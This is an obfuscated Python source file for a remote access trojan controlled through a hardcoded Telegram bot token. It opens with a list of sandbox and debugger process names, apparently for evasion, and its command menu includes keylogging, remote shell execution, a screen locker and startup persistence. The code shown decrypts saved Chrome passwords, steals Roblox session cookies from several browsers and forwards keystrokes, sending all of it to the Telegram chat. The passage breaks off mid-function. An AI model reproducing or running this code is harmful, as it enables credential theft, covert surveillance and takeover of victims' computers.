Cd ='joeboxserver.exe'#line:1
Cc ='ksdumper.exe'#line:2
Cb ='ksdumperclient.exe'#line:3
Ca ='joeboxcontrol.exe'#line:4
CZ ='qemu-ga.exe'#line:5
CY ='xenservice.exe'#line:6
CX ='prl_tools.exe'#line:7
CW ='prl_cc.exe'#line:8
CV ='x32dbg.exe'#line:9
CU ='x96dbg.exe'#line:10
CT ='vmacthlp.exe'#line:11
CS ='vgauthservice.exe'#line:12
CR ='pestudio.exe'#line:13
CQ ='ollydbg.exe'#line:14
CP ='ida64.exe'#line:15
CO ='vmwaretray.exe'#line:16
CN ='vboxtray.exe'#line:17
CM ='df5serv.exe'#line:18
CL ='vboxservice.exe'#line:19
CK ='fiddler.exe'#line:20
CJ ='wireshark.exe'#line:21
CI ='httpdebuggerui.exe'#line:22
CH ='dumpcap.exe'#line:23
CG ='fakenet.exe'#line:24
CF ='vmwareuser.exe'#line:25
CE ='explorer.exe'#line:26
CD ='ProcessHacker.exe'#line:27
CC ='Taskmgr.exe'#line:28
CB ='perfmon.exe'#line:29
CA ='wmic process get description'#line:30
C9 ='Windows is blocked!'#line:31
C8 ='Enter record time:'#line:32
C7 ='Keylogger stopped!'#line:33
C6 ='default'#line:34
C5 ='User Data'#line:35
C4 ='Chrome'#line:36
C3 ='Google'#line:37
C2 ='AppData'#line:38
C1 ='USERPROFILE'#line:39
C0 ='waiting_for_path'#line:40
B_ ='password is wrong'#line:41
Bz ='Logged successfully!'#line:42
By ='❗I am not responsible for your actions❕'#line:43
Bx ='Connection!'#line:44
Bw ='Enter password:'#line:45
Bv =IndexError #line:46
Bk ='attrib +h r.txt'#line:47
Bj ='cd '#line:48
Bi ='cd..'#line:49
Bh ='tasklist'#line:50
Bg ='Please wait...'#line:51
Bf ='optionright'#line:52
Be ='optionleft'#line:53
Bd ='option'#line:54
Bc ='command'#line:55
Bb ='yen'#line:56
Ba ='winright'#line:57
BZ ='winleft'#line:58
BY ='volumemute'#line:59
BX ='tab'#line:60
BW ='subtract'#line:61
BV ='stop'#line:62
BU ='space'#line:63
BT ='shiftright'#line:64
BS ='shiftleft'#line:65
BR ='shift'#line:66
BQ ='separator'#line:67
BP ='select'#line:68
BO ='scrolllock'#line:69
BN ='return'#line:70
BM ='prtscr'#line:71
BL ='prtsc'#line:72
BK ='prntscrn'#line:73
BJ ='printscreen'#line:74
BI ='print'#line:75
BH ='prevtrack'#line:76
BG ='playpause'#line:77
BF ='pgup'#line:78
BE ='pgdn'#line:79
BD ='pause'#line:80
BC ='pageup'#line:81
BB ='pagedown'#line:82
BA ='numlock'#line:83
B9 ='num9'#line:84
B8 ='num8'#line:85
B7 ='num7'#line:86
B6 ='num6'#line:87
B5 ='num5'#line:88
B4 ='num4'#line:89
B3 ='num3'#line:90
B2 ='num2'#line:91
B1 ='num1'#line:92
B0 ='num0'#line:93
A_ ='nonconvert'#line:94
Az ='nexttrack'#line:95
Ay ='multiply'#line:96
Ax ='modechange'#line:97
Aw ='launchmediaselect'#line:98
Av ='launchmail'#line:99
Au ='launchapp2'#line:100
At ='launchapp1'#line:101
As ='kanji'#line:102
Ar ='kana'#line:103
Aq ='junja'#line:104
Ap ='insert'#line:105
Ao ='home'#line:106
An ='hanja'#line:107
Am ='hangul'#line:108
Al ='hanguel'#line:109
Ak ='final'#line:110
Aj ='f24'#line:111
Ai ='f23'#line:112
Ah ='f22'#line:113
Ag ='f21'#line:114
Af ='f20'#line:115
Ae ='f19'#line:116
Ad ='f18'#line:117
Ac ='f17'#line:118
Ab ='f16'#line:119
Aa ='f15'#line:120
AZ ='f14'#line:121
AY ='f13'#line:122
AX ='f12'#line:123
AW ='f11'#line:124
AV ='f10'#line:125
AU ='escape'#line:126
AT ='esc'#line:127
AS ='enter'#line:128
AR ='end'#line:129
AQ ='divide'#line:130
AP ='delete'#line:131
AO ='del'#line:132
AN ='decimal'#line:133
AM ='ctrlright'#line:134
AL ='ctrlleft'#line:135
AK ='convert'#line:136
AJ ='clear'#line:137
AI ='capslock'#line:138
AH ='browserstop'#line:139
AG ='browsersearch'#line:140
AF ='browserrefresh'#line:141
AE ='browserhome'#line:142
AD ='browserforward'#line:143
AC ='browserfavorites'#line:144
AB ='browserback'#line:145
AA ='backspace'#line:146
A9 ='altright'#line:147
A8 ='altleft'#line:148
A7 ='add'#line:149
A6 ='accept'#line:150
A5 =enumerate #line:151
A1 ='cmd.exe'#line:152
A0 ='sleep'#line:153
z ='right'#line:154
y ='left'#line:155
x ='help'#line:156
w ='f4'#line:157
v ='execute'#line:158
u ='ctrl'#line:159
t ='apps'#line:160
s ='e'#line:161
r =':'#line:162
q ='/'#line:163
p ='-'#line:164
o ='r'#line:165
n ='whoami'#line:166
i ='498j-33v1-9d24-z390.mkv'#line:167
h ='\n'#line:168
g ='win'#line:169
f ='up'#line:170
e ='down'#line:171
d ='alt'#line:172
c ='\\'#line:173
b ='='#line:174
X ='_windows_.txt'#line:175
W ='utf-8'#line:176
V =range #line:177
Q ='volumedown'#line:178
P ='w'#line:179
O =int #line:180
N ='volumeup'#line:181
M =None #line:182
L =False #line:183
K ='rb'#line:184
J =True #line:185
G =len #line:186
F =open #line:187
E =str #line:188
C =Exception #line:189
import telebot ,os as B ,random as Bl ,pyttsx3 ,pyautogui as D ,cv2 as H ,json ,ctypes as I ,base64 ,sqlite3 ,win32crypt as Bm #line:190
from Cryptodome .Cipher import AES #line:191
import time as R ,stat as A2 ,pyaudio as Bn ,wave ,browser_cookie3 as S ,numpy as Ce ,shutil as Bo #line:192
from pynput import keyboard as Cf #line:193
from datetime import datetime as Cg ,timedelta as Ch #line:194
try :A =telebot .TeleBot ('7741383387:AAE7SORgtQaJsYNMAQkzxTZYbkTDUx6Qxa4')#line:195
except C as Cy :pass #line:196
Bp ="\n## **🛠️ System Commands**\n- ⚙️ **/start** - Start the program\n- ⚙️ **/help** - Help with commands\n- 🔌 **/addstartup** - Add autostart\n- 📁 **/filepath** - Shows the script's full path\n- ⌨️ **/keylogger** - Start keylogger\n- ⛔ **/stopkeylogger** - Stop keylogger\n- 👟 **/run [filepath]** - Run file\n- 🧑🏻\u200d💻 **/users** - Show users on the PC\n- 🖥️ **/whoami** - Show the name of the PC\n- 📃 **/tasklist** - Show running tasks\n- 🧨 **/taskkill [task]** - Kill the entered task\n- 💤 **/sleep** - Put the PC to sleep\n- 🕚 **/shutdown** - Shutdown the PC\n- 🔄 **/restart** - Restart the PC\n- 💥 **/altf4** - ALT + F4 (google it to find what it means)\n- 💣 **/cmdbomb** - Opens 10 CMD windows\n- Ⓜ️ **/msg [type] [title] [text]** - Displays a messagebox\n*/msg types(info; warning; error; question; default or 0)*\n** for ex: /msg error testtitle testtext **\n\n## **🔒 Security & Privacy**\n- 🔑 **/passwords** - Show saved passwords on the PC\n- 🍪 **/robloxcookie** - Show Roblox cookies\n- 🧱 **/wallpaper** - Change the desktop wallpaper\n- 🪦 **/disabletaskmgr** - Disable Task Manager\n- 📠 **/enabletaskmgr** - Enable Task Manager\n- ☢️ **/winblocker** - My own winlocker\n- ☣️ **/winblocker2** - If winblocker doesn't work\n\n## **📱 Device Management**\n- 📷 **/screenshot** - Take a screenshot\n- 🎙️ **/mic [time in seconds]** - Record the PC's microphone\n- 📹 **/webscreen** - Get a screenshot from the camera\n- 🎦 **/webcam** - Get webcam video\n- 🎥 **/screenrecord** - Record the screen\n- 🚫 **/block** - Block user input (mouse and keyboard)\n- ✅ **/unblock** - Unblock user input (mouse and keyboard)\n- 🖱️ **/mousemesstart** - Start mouse messing\n- 🐁 **/mousemesstop** - Stop mouse messing\n- 🪤 **/mousekill** - Disable the mouse\n- 🐭 **/mousestop** - Enable the mouse\n- 🖱️ **/mousemove [x] [y]** - Enter x and y cordinates and mouse's pointer goes there\n- 🐁 **/mouseclick** - Make click with mouse\n- 🔊 **/fullvolume** - Set volume to full\n- 🔉 **/volumeplus** - Increase volume by 10\n- 🔇 **/volumeminus** - Decrease volume by 10\n- 🔄️ **/rotate** - Rotate monitor +90 degrees\n- 🪟 **/maximize** - Maximize active window\n- 🪟 **/minimize** - Minimize active window\n\n## **🌐 Networking**\n- 🛜 **/wifilist** - Show saved Wi-Fi networks\n- 🔐 **/wifipass [accesspoint]** - Show the password of a saved Wi-Fi network\n- 🌐 **/chrome [website URL]** - Open a website in Chrome\n- 🌐 **/edge [website URL]** - Open a website in Edge\n- 🌐 **/firefox [website URL]** - Open a website in Firefox\n\n## **🎶 Multimedia**\n- 💬👂🏻 **/textspech [your text]** - Speak the text aloud\n- 🎵 **/playsound [file path]** - Play a sound file (first upload the file using **/upload**)\n- 📁 **/download [file path]** - Download a file from the PC\n- 🗃️ **/upload** - Upload a file to the PC\n- 📋 **/clipboard** - Show clipboard content\n- 📇 **/changeclipboard [testcahnge]** - Change clipboard content\n\n## **⚙️ Advanced Operations**\n- 🗡️ **/e [command]** - Execute shell commands (shortcut)\n- 🏹 **/ex [command]** - Execute shell commands with long responses\n- 🔫 **/execute** - Execute shell commands my alternative of netcat in linux (works commands such as cd ,cd.. and etc...)\n- *commands like cd ,cd .. and others work excellent in the /e ,  /ex and /execute commands.*\n- 📅 **/metadata [filepath]** - Displays the file's metadata information\n- ⌨️ **/keytype [key]** - Enter a text and that text will written with pc's keyboard\n- ⌨️ **/keypress [key]** - Press a specific key on the keyboard\n- ⌨️ **/keypresstwo [key1] [key2]** - Press two keys simultaneously\n- ⌨️ **/keypressthree [key1] [key2] [key3]** - Press three keys simultaneously\n- 🕶️ **/hide** - Hide your app\n- 👓 **/unhide** - Unhide your app\n\n## **🖥️ System Information**\n- 🪪 **/info** - Show PC information (IP, location, country, city)\n- 📊 **/pcinfo** - Info about PC's OS, system, CPU, Windows version, BIOS, etc...\n- 💻 **/shortinfo** - Show's less but, mostly the necessary information about pc\n- 🛠️ **/apps** - Show installed apps on the PC\n- 🔋 **/batteryinfo** - Show info about battery \n\n## **EXAMPLES:**\n- 📖 **/examples** - Shows examples\n\n\n"#line:197
Ci ="\n## **Examples:**\n- **/e whoami** → **Output**: win-9bn5tk4e2b7\\user\n- **/e cd /home** → **Output**: You are in: home\n- **/run C:\\Users\\user\\Pictures\\test.png** → **Output**: File opened successfully!\n- **/mousemove 50 80 ** → **Output**: Mouse pointer moved to {x} and {y} cordinates successfully!\n- **/keypress x ** → **Output**: 'x' key has pressed successfully!\n- **/msg info testtitle testtexthi** → **Output**: Successfully displayed! \n"#line:198
T =L #line:199
@A .message_handler (commands =['start'])#line:200
def Cz (O0O0OO0OO00OOO000 ):#line:201
	O0O0OOO0OO00O0OOO =O0O0OO0OO00OOO000 #line:202
	if T ==L :A .send_message (O0O0OOO0OO00O0OOO .chat .id ,Bw );A .register_next_step_handler (O0O0OOO0OO00O0OOO ,Cj )#line:203
	else :#line:204
		A .send_message (O0O0OOO0OO00O0OOO .chat .id ,Bx )#line:205
		if O0O0OOO0OO00O0OOO .from_user .last_name ==M :A .send_message (O0O0OOO0OO00O0OOO .chat .id ,f"Salam aleykum, {O0O0OOO0OO00O0OOO.from_user.first_name}! I promise you will use this only for educational purposes :)")#line:206
		else :A .send_message (O0O0OOO0OO00O0OOO .chat .id ,f"Salam aleykum ,{O0O0OOO0OO00O0OOO.from_user.first_name} {O0O0OOO0OO00O0OOO.from_user.last_name}! I promise you will use this only for educational purposes :)")#line:207
		A .send_message (O0O0OOO0OO00O0OOO .chat .id ,By );O0OOOO0OOOOO000OO =B .popen (n ).read ().strip ();A .send_message (O0O0OOO0OO00O0OOO .chat .id ,f"You can use /help");A .send_message (O0O0OOO0OO00O0OOO .chat .id ,f"Pc's name is: {O0OOOO0OOOOO000OO}")#line:208
def Cj (O0OO0O000O0O0OO0O ):#line:209
	O0OOO0OOOOOO00OOO =O0OO0O000O0O0OO0O #line:210
	if O0OOO0OOOOOO00OOO .text =='acd':#line:211
		global T ;T =J ;A .send_message (O0OOO0OOOOOO00OOO .chat .id ,Bz );A .send_message (O0OOO0OOOOOO00OOO .chat .id ,Bx )#line:212
		if O0OOO0OOOOOO00OOO .from_user .last_name ==M :A .send_message (O0OOO0OOOOOO00OOO .chat .id ,f"Salam aleykum, {O0OOO0OOOOOO00OOO.from_user.first_name}! I promise you will use this only for educational purposes :)")#line:213
		else :A .send_message (O0OOO0OOOOOO00OOO .chat .id ,f"Salam aleykum ,{O0OOO0OOOOOO00OOO.from_user.first_name} {O0OOO0OOOOOO00OOO.from_user.last_name}! I promise you will use this only for educational purposes :)")#line:214
		A .send_message (O0OOO0OOOOOO00OOO .chat .id ,By );O00OOO00OO000O0O0 =B .popen (n ).read ().strip ();A .send_message (O0OOO0OOOOOO00OOO .chat .id ,f"You can use /help");A .send_message (O0OOO0OOOOOO00OOO .chat .id ,f"Pc name is: {O00OOO00OO000O0O0}")#line:215
	else :A .send_message (O0OOO0OOOOOO00OOO .chat .id ,B_ )#line:216
A3 ={}#line:217
@A .message_handler (commands =['addstartup'])#line:218
def C_ (O00O000O0000000O0 ):O00O00O0OOO0O0O0O =O00O000O0000000O0 ;A .send_message (O00O00O0OOO0O0O0O .chat .id ,'Enter the name of your exe file (full path):');A3 [O00O00O0OOO0O0O0O .chat .id ]=C0 #line:219
@A .message_handler (func =lambda OO0OOOO0OO00OO00O :A3 .get (OO0OOOO0OO00OO00O .chat .id )==C0 )#line:220
def D0 (O0OO00O0O0O0OOOO0 ):#line:221
	OO0O00000OOOO0000 =O0OO00O0O0O0OOOO0 ;O00O00O0O0OO0000O =OO0O00000OOOO0000 .text ;O00OOOOOOO0O000O0 =B .path .join (B .getenv ('APPDATA'),'Microsoft\\Windows\\Start Menu\\Programs\\Startup')#line:222
	if not B .path .exists (O00O00O0O0OO0000O ):A .send_message (OO0O00000OOOO0000 .chat .id ,'The specified file does not exist. Please try again.')#line:223
	elif not O00O00O0O0OO0000O .lower ().endswith ('.exe'):A .send_message (OO0O00000OOOO0000 .chat .id ,'Please provide a valid .exe file path.')#line:224
	elif B .path .isdir (O00OOOOOOO0O000O0 ):#line:225
		OO000OOO0O0O0OO0O =B .path .basename (O00O00O0O0OO0000O );O00O000000OOO000O =B .path .join (O00OOOOOOO0O000O0 ,OO000OOO0O0O0OO0O )#line:226
		try :Bo .copyfile (O00O00O0O0OO0000O ,O00O000000OOO000O );A .send_message (OO0O00000OOOO0000 .chat .id ,f"{OO000OOO0O0O0OO0O} added to startup successfully!")#line:227
		except C as O0OO000OOOO0O00O0 :A .send_message (OO0O00000OOOO0000 .chat .id ,f"Failed to add to startup: {O0OO000OOOO0O00O0}")#line:228
	else :A .send_message (OO0O00000OOOO0000 .chat .id ,'Startup folder not found.')#line:229
	A3 .pop (OO0O00000OOOO0000 .chat .id ,M )#line:230
@A .message_handler (commands =['filepath'])#line:231
def D1 (O0OO0O00O0O00OO0O ):#line:232
	O0O00O00OOO0O000O =O0OO0O00O0O00OO0O #line:233
	try :OOO000OOO0OO00000 =B .path .abspath (__file__ );A .send_message (O0O00O00OOO0O000O .chat .id ,E (OOO000OOO0OO00000 ))#line:234
	except C as OOO00O00O00000O00 :A .send_message (O0O00O00OOO0O000O .chat .id ,f"Failed to add to startup: {OOO00O00O00000O00}")#line:235
@A .message_handler (commands =['robloxcookie'])#line:236
def D2 (O000000O0000O00O0 ):#line:237
	OOOO0000O00000O00 ='all_roblox_cookie.txt';OOO00O0OO00O0O000 ='.ROBLOSECURITY';OOOOO00OOOOO00OOO ='roblox.com';OOOOOOOOOOOOOOO0O =O000000O0000O00O0 ;OOOOOOOO0000OO0OO =[]#line:238
	try :#line:239
		O00O000O00OOO00OO =S .chrome (domain_name =OOOOO00OOOOO00OOO )#line:240
		for O00OOO00O0O0O0O00 in O00O000O00OOO00OO :#line:241
			A .send_message (OOOOOOOOOOOOOOO0O .chat .id ,O00OOO00O0O0O0O00 )#line:242
			if O00OOO00O0O0O0O00 .name ==OOO00O0OO00O0O000 :OOOOOOOO0000OO0OO .append (O00O000O00OOO00OO );OOOOOOOO0000OO0OO .append (O00OOO00O0O0O0O00 .value );global Bq ;global Br ;Bq =O00OOO00O0O0O0O00 .name ;Br =O00OOO00O0O0O0O00 .value #line:243
	except C as OO0OO00OOO0OOOO00 :A .send_message (OOOOOOOOOOOOOOO0O .chat .id ,f"Error:{OO0OO00OOO0OOOO00}")#line:244
	try :#line:245
		O00O000O00OOO00OO =S .brave (domain_name =OOOOO00OOOOO00OOO )#line:246
		for O00OOO00O0O0O0O00 in O00O000O00OOO00OO :#line:247
			A .send_message (OOOOOOOOOOOOOOO0O .chat .id ,O00OOO00O0O0O0O00 )#line:248
			if O00OOO00O0O0O0O00 .name ==OOO00O0OO00O0O000 :OOOOOOOO0000OO0OO .append (O00O000O00OOO00OO );OOOOOOOO0000OO0OO .append (O00OOO00O0O0O0O00 .value );return OOOOOOOO0000OO0OO #line:249
	except :pass #line:250
	try :#line:251
		O00O000O00OOO00OO =S .firefox (domain_name =OOOOO00OOOOO00OOO )#line:252
		for O00OOO00O0O0O0O00 in O00O000O00OOO00OO :#line:253
			if O00OOO00O0O0O0O00 .name ==OOO00O0OO00O0O000 :OOOOOOOO0000OO0OO .append (O00O000O00OOO00OO );OOOOOOOO0000OO0OO .append (O00OOO00O0O0O0O00 .value );return OOOOOOOO0000OO0OO #line:254
	except :pass #line:255
	try :#line:256
		O00O000O00OOO00OO =S .chromium (domain_name =OOOOO00OOOOO00OOO )#line:257
		for O00OOO00O0O0O0O00 in O00O000O00OOO00OO :#line:258
			if O00OOO00O0O0O0O00 .name ==OOO00O0OO00O0O000 :OOOOOOOO0000OO0OO .append (O00O000O00OOO00OO );OOOOOOOO0000OO0OO .append (O00OOO00O0O0O0O00 .value );return OOOOOOOO0000OO0OO #line:259
	except :pass #line:260
	try :#line:261
		O00O000O00OOO00OO =S .edge (domain_name =OOOOO00OOOOO00OOO )#line:262
		for O00OOO00O0O0O0O00 in O00O000O00OOO00OO :#line:263
			if O00OOO00O0O0O0O00 .name ==OOO00O0OO00O0O000 :print ('L');OOOOOOOO0000OO0OO .append (O00O000O00OOO00OO );OOOOOOOO0000OO0OO .append (O00OOO00O0O0O0O00 .value );return OOOOOOOO0000OO0OO #line:264
	except :pass #line:265
	try :#line:266
		O00O000O00OOO00OO =S .opera (domain_name =OOOOO00OOOOO00OOO )#line:267
		for O00OOO00O0O0O0O00 in O00O000O00OOO00OO :#line:268
			if O00OOO00O0O0O0O00 .name ==OOO00O0OO00O0O000 :OOOOOOOO0000OO0OO .append (O00O000O00OOO00OO );OOOOOOOO0000OO0OO .append (O00OOO00O0O0O0O00 .value );return OOOOOOOO0000OO0OO #line:269
	except :pass #line:270
	try :A .send_message (OOOOOOOOOOOOOOO0O .chat .id ,f"security_cookie_name:{Bq}");A .send_message (OOOOOOOOOOOOOOO0O .chat .id ,f"security_cookie_value:{Br}")#line:271
	except C as OO0OO00OOO0OOOO00 :A .send_document (OOOOOOOOOOOOOOO0O .chat .id ,f"Error:{OO0OO00OOO0OOOO00}")#line:272
	try :#line:273
		with F (OOOO0000O00000O00 ,P ,encoding =W )as OOOO000OOOO0OO0OO :OOOO000OOOO0OO0OO .write (E (OOOOOOOO0000OO0OO ))#line:274
		with F (OOOO0000O00000O00 ,K )as OOOO000OOOO0OO0OO :A .send_document (OOOOOOOOOOOOOOO0O .chat .id ,OOOO000OOOO0OO0OO )#line:275
	except C as OO0OO00OOO0OOOO00 :A .send_document (OOOOOOOOOOOOOOO0O .chat .id ,f"Error:{OO0OO00OOO0OOOO00}")#line:276
	try :B .remove (OOOO0000O00000O00 )#line:277
	except C as OO0OO00OOO0OOOO00 :A .send_document (OOOOOOOOOOOOOOO0O .chat .id ,f"Error:{OO0OO00OOO0OOOO00}")#line:278
@A .message_handler (commands =['passwords'])#line:279
def D3 (OO00O00000000OO00 ):#line:280
	OO0OO0OO0OOOO0OO0 ='SELECT origin_url, action_url, username_value, password_value, date_created, date_last_used FROM logins ORDER BY date_created';O00OOO0OO000OO0O0 ='passwords.txt';OOO0OOO0000O0000O =OO00O00000000OO00 ;A .send_message (OOO0OOO0000O0000O .chat .id ,'Catching passwords...');OOO0OOO000OO00OO0 =Ck ();O0OOOOO0OOO0O0OO0 =B .path .join (B .environ [C1 ],C2 ,'Local',C3 ,C4 ,C5 ,C6 ,'Login Data');O0O0O0O0O0000OO00 ='ChromeData.db';Bo .copyfile (O0OOOOO0OOO0O0OO0 ,O0O0O0O0O0000OO00 );O00O0O00OO0OO0OO0 =sqlite3 .connect (O0O0O0O0O0000OO00 );O000000O0OOOOOOO0 =O00O0O00OO0OO0OO0 .cursor ();O000000O0OOOOOOO0 .execute (OO0OO0OO0OOOO0OO0 )#line:281
	for OOOOO00OOO000OO00 in O000000O0OOOOOOO0 .fetchall ():#line:282
		O0OO00O00000O0O00 =OOOOO00OOO000OO00 [0 ];O00O0O0OO0OO00O0O =OOOOO00OOO000OO00 [1 ];O0OO0000O0OO0000O =OOOOO00OOO000OO00 [2 ];O00000OOO0OO000OO =Bs (OOOOO00OOO000OO00 [3 ],OOO0OOO000OO00OO0 );O0OOO00OOO000000O =OOOOO00OOO000OO00 [4 ];OO000O0OO000O0OOO =OOOOO00OOO000OO00 [5 ]#line:283
		if O0OO0000O0OO0000O or O00000OOO0OO000OO :A .send_message (OOO0OOO0000O0000O .chat .id ,f"Origin URL: {O0OO00O00000O0O00}");A .send_message (OOO0OOO0000O0000O .chat .id ,f"Action URL: {O00O0O0OO0OO00O0O}");A .send_message (OOO0OOO0000O0000O .chat .id ,f"Username: {O0OO0000O0OO0000O}");A .send_message (OOO0OOO0000O0000O .chat .id ,f"Password: {O00000OOO0OO000OO}")#line:284
		else :continue #line:285
		if O0OOO00OOO000000O !=86400000000 and O0OOO00OOO000000O :A .send_message (OOO0OOO0000O0000O .chat .id ,f"Creation date: {E(j(O0OOO00OOO000000O))}")#line:286
		if OO000O0OO000O0OOO !=86400000000 and OO000O0OO000O0OOO :A .send_message (OOO0OOO0000O0000O .chat .id ,f"Last Used: {E(j(OO000O0OO000O0OOO))}")#line:287
		A .send_message (OOO0OOO0000O0000O .chat .id ,b *50 )#line:288
	OO000OO0O0OO0O0OO ='';O000000O0OOOOOOO0 .execute (OO0OO0OO0OOOO0OO0 )#line:289
	for OOOOO00OOO000OO00 in O000000O0OOOOOOO0 .fetchall ():#line:290
		O0OO00O00000O0O00 =OOOOO00OOO000OO00 [0 ];O00O0O0OO0OO00O0O =OOOOO00OOO000OO00 [1 ];O0OO0000O0OO0000O =OOOOO00OOO000OO00 [2 ];O00000OOO0OO000OO =Bs (OOOOO00OOO000OO00 [3 ],OOO0OOO000OO00OO0 );O0OOO00OOO000000O =OOOOO00OOO000OO00 [4 ];OO000O0OO000O0OOO =OOOOO00OOO000OO00 [5 ]#line:291
		if O0OO0000O0OO0000O or O00000OOO0OO000OO :OO000OO0O0OO0O0OO +=f"Origin URL: {O0OO00O00000O0O00}\n";OO000OO0O0OO0O0OO +=f"Action URL: {O00O0O0OO0OO00O0O}\n";OO000OO0O0OO0O0OO +=f"Username: {O0OO0000O0OO0000O}\n";OO000OO0O0OO0O0OO +=f"Password: {O00000OOO0OO000OO}\n"#line:292
		if O0OOO00OOO000000O !=86400000000 and O0OOO00OOO000000O :OO000OO0O0OO0O0OO +=f"Creation date: {E(j(O0OOO00OOO000000O))}\n"#line:293
		if OO000O0OO000O0OOO !=86400000000 and OO000O0OO000O0OOO :OO000OO0O0OO0O0OO +=f"Last Used: {E(j(OO000O0OO000O0OOO))}\n"#line:294
		OO000OO0O0OO0O0OO +=b *50 +'\n\n'#line:295
	O000000O0OOOOOOO0 .close ();O00O0O00OO0OO0OO0 .close ()#line:296
	try :B .remove (O0O0O0O0O0000OO00 )#line:297
	except C as O000OO0000OO00O0O :print (f"Error while deleting file: {O000OO0000OO00O0O}")#line:298
	if OO000OO0O0OO0O0OO :#line:299
		with F (O00OOO0OO000OO0O0 ,P ,encoding =W )as O0O00000000000OOO :O0O00000000000OOO .write (OO000OO0O0OO0O0OO )#line:300
		with F (O00OOO0OO000OO0O0 ,K )as O0O00000000000OOO :A .send_document (OOO0OOO0000O0000O .chat .id ,O0O00000000000OOO )#line:301
	else :A .send_message (OOO0OOO0000O0000O .chat .id ,'There is no passwordds to send them.')#line:302
	B .remove (O00OOO0OO000OO0O0 )#line:303
def Ck ():#line:304
	O00000000OOOOOO00 =B .path .join (B .environ [C1 ],C2 ,'Local',C3 ,C4 ,C5 ,'Local State')#line:305
	with F (O00000000OOOOOO00 ,o ,encoding =W )as O000O0000O0OO00O0 :O00O000OOOO0OOOOO =O000O0000O0OO00O0 .read ();O00O000OOOO0OOOOO =json .loads (O00O000OOOO0OOOOO )#line:306
	OOOO00O0O000OOOOO =base64 .b64decode (O00O000OOOO0OOOOO ['os_crypt']['encrypted_key']);OOOO00O0O000OOOOO =OOOO00O0O000OOOOO [5 :];return Bm .CryptUnprotectData (OOOO00O0O000OOOOO ,M ,M ,M ,0 )[1 ]#line:307
def Bs (O0O00000OOOOO0OO0 ,OOOO00OOO00O0O000 ):#line:308
	O0OOO00OOO0O00OO0 =O0O00000OOOOO0OO0 #line:309
	try :OO0000O000O0OOOO0 =O0OOO00OOO0O00OO0 [3 :15 ];O0OOO00OOO0O00OO0 =O0OOO00OOO0O00OO0 [15 :];O00OOO0O000O0OOO0 =AES .new (OOOO00OOO00O0O000 ,AES .MODE_GCM ,OO0000O000O0OOOO0 );return O00OOO0O000O0OOO0 .decrypt (O0OOO00OOO0O00OO0 )[:-16 ].decode ()#line:310
	except C as O00OOOO0OOOO00O00 :#line:311
		try :return E (Bm .CryptUnprotectData (O0OOO00OOO0O00OO0 ,M ,M ,M ,0 )[1 ])#line:312
		except :return ''#line:313
def j (OOOO0OO00O0O00000 ):return Cg (1601 ,1 ,1 )+Ch (microseconds =OOOO0OO00O0O00000 )#line:314
@A .message_handler (commands =['taskkill'])#line:315
def D4 (OO0OO00OO0OOO0O00 ):#line:316
	OO0OO0OO000O0OO0O =OO0OO00OO0OOO0O00 #line:317
	try :O0O0O000O0OOOO0OO =OO0OO0OO000O0OO0O .text .split ('/taskkill',1 )[1 ].strip ();OOO0O00O0O0OOOO0O =B .popen (f"taskkill /f /im {O0O0O000O0OOOO0OO}").read ().strip ();A .send_message (OO0OO0OO000O0OO0O .chat .id ,f"{OOO0O00O0O0OOOO0O}")#line:318
	except C as O0OO0OO000O00OOOO :A .send_message (OO0OO0OO000O0OO0O .chat .id ,f"Error: {O0OO0OO000O00OOOO}")#line:319
@A .message_handler (commands =['msg'])#line:320
def D5 (OOO0OO0O0OO000O0O ):#line:321
	OOO0OOOO00O000OOO =OOO0OO0O0OO000O0O #line:322
	try :O0O0OO00000O00O00 =OOO0OOOO00O000OOO .text .split ('/msg',1 )[1 ].strip ().split ();OOOOO0OOOO0000OO0 =O0O0OO00000O00O00 [0 ];OOO0O00O000O00O0O =O0O0OO00000O00O00 [1 ];OOO000OO0O00OOOOO =O0O0OO00000O00O00 [2 ];OOO0OO0O0OOO0O0OO ={'info':64 ,'warning':48 ,'error':16 ,'question':32 ,C6 :0 };OOOOO0OOOO0000OO0 =OOO0OO0O0OOO0O0OO .get (OOOOO0OOOO0000OO0 ,0 );O0OOOOO0OO0OO0O00 =f'mshta vbscript:Execute("msgbox ""{OOO000OO0O00OOOOO}"", {OOOOO0OOOO0000OO0}, ""{OOO0O00O000O00O0O}"":close")';A .send_message (OOO0OOOO00O000OOO .chat .id ,'Successfully displayed!');B .popen (O0OOOOO0OO0OO0O00 )#line:323
	except C as O00O000OO0OOOO0OO :A .send_message (OOO0OOOO00O000OOO .chat .id ,f"Error:{O00O000OO0OOOO0OO}")#line:324
@A .message_handler (commands =['stopkeylogger'])#line:325
def D6 (OO00O00O0O0000000 ):global k ;k =1 ;A .send_message (OO00O00O0O0000000 .chat .id ,C7 )#line:326
@A .message_handler (commands =['keylogger'])#line:327
def D7 (OO0OOO00OO00O0OO0 ):#line:328
	O0O0OOOOOOOO0OOO0 =OO0OOO00OO00O0OO0 #line:329
	try :#line:330
		A .send_message (O0O0OOOOOOOO0OOO0 .chat .id ,'Keylogger started!');A .send_message (O0O0OOOOOOOO0OOO0 .chat .id ,'Run: /stopkeylogger to stop');global k ;k =0 #line:331
		def OOOOO0O0OOOOO00O0 (O000O00O0O00O00O0 ):#line:332
			try :A .send_message (O0O0OOOOOOOO0OOO0 .chat .id ,f"Pressed key: {O000O00O0O00O00O0.char}")#line:333
			except AttributeError :A .send_message (O0O0OOOOOOOO0OOO0 .chat .id ,f"Special key pressed: {O000O00O0O00O00O0}")#line:334
		def O0O000OOO00OO0OOO (OO00OO00OOO00O000 ):#line:335
			if k ==1 :A .send_message (O0O0OOOOOOOO0OOO0 .chat .id ,C7 );return L #line:336
		with Cf .Listener (on_press =OOOOO0O0OOOOO00O0 ,on_release =O0O000OOO00OO0OOO )as O0O0OOOOO0OO00000 :O0O0OOOOO0OO00000 .join ()#line:337
	except C as OO0O0000OOO00OOO0 :A .send_message (O0O0OOOOOOOO0OOO0 .chat .id ,f"Error:{OO0O0000OOO00OOO0}")#line:338
@A .message_handler (commands =['clipboard'])#line:339
def D8 (OO0O0OOO00000OOO0 ):#line:340
	OOO0O0O0O0OOO00O0 =OO0O0OOO00000OOO0 ;O0O000O0O00000OOO =OOO0O0O0O0OOO00O0 .from_user .id ;OO00O0O0OO0OOOOO0 =OOO0O0O0O0OOO00O0 .chat .id #line:341
	if O0O000O0O00000OOO ==OO00O0O0OO0OOOOO0 :#line:342
